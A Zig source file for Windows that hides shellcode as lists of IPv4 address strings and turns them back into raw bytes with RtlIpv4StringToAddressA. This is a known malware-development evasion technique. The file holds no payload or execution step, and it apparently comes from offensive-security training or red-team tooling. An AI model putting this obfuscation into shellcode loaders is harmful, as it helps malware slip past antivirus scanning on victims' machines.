const std = @import("std");
const win = @import("zigwin32").everything;
const assert = std.debug.assert;

const PSTR = win.PSTR;
const IN_ADDR = win.IN_ADDR;

const RtlIpv4StringToAddressA = win.RtlIpv4StringToAddressA;

fn generateIpv4(allocator: std.mem.Allocator, a: u8, b: u8, c: u8, d: u8) ![:0]u8 {
    return std.fmt.allocPrintZ(allocator, "{d}.{d}.{d}.{d}", .{ a, b, c, d });
}

pub fn obfuscate(allocator: std.mem.Allocator, shell_code: []const u8) ![][:0]const u8 {
    assert(shell_code.len % 4 == 0);

    var ipv4_array = try std.ArrayList([:0]const u8).initCapacity(allocator, shell_code.len / 4);
    errdefer freeIpv4Array(allocator, ipv4_array.items);

    var i: usize = 0;
    while (i < shell_code.len) : (i += 4) {
        const ipv4 = try generateIpv4(allocator, shell_code[i], shell_code[i + 1], shell_code[i + 2], shell_code[i + 3]);
        ipv4_array.appendAssumeCapacity(ipv4);
    }

    return ipv4_array.toOwnedSlice();
}

pub fn deobfuscate(allocator: std.mem.Allocator, ipv4_array: []const [:0]const u8) ![]u8 {
    var shell_code = try std.ArrayList(u8).initCapacity(allocator, ipv4_array.len * 4);
    errdefer shell_code.deinit();

    for (ipv4_array) |ipv4| {
        var addr: IN_ADDR = undefined;
        var terminator: ?PSTR = null;

        const status = RtlIpv4StringToAddressA(ipv4, 0, &terminator, &addr);
        if (status != 0) {
            std.debug.print("IPv4Deobfuscation Failed With Error Code: {d}\n", .{status});
            return error.IPv4DeobfuscationFailed;
        }

        shell_code.appendSliceAssumeCapacity(std.mem.asBytes(&addr));
    }

    return shell_code.toOwnedSlice();
}

pub fn printIpv4Array(writer: anytype, ipv4_array: []const [:0]const u8) !void {
    try writer.writeAll("IPv4 Array: [");
    for (ipv4_array, 0..) |ipv4, i| {
        if (i > 0) try writer.writeAll(", ");
        try writer.print("\"{s}\"", .{ipv4});
    }
    try writer.writeAll("]\n");
}

pub fn freeIpv4Array(allocator: std.mem.Allocator, ipv4_array: [][:0]const u8) void {
    for (ipv4_array) |ipv4| allocator.free(ipv4);
    allocator.free(ipv4_array);
}
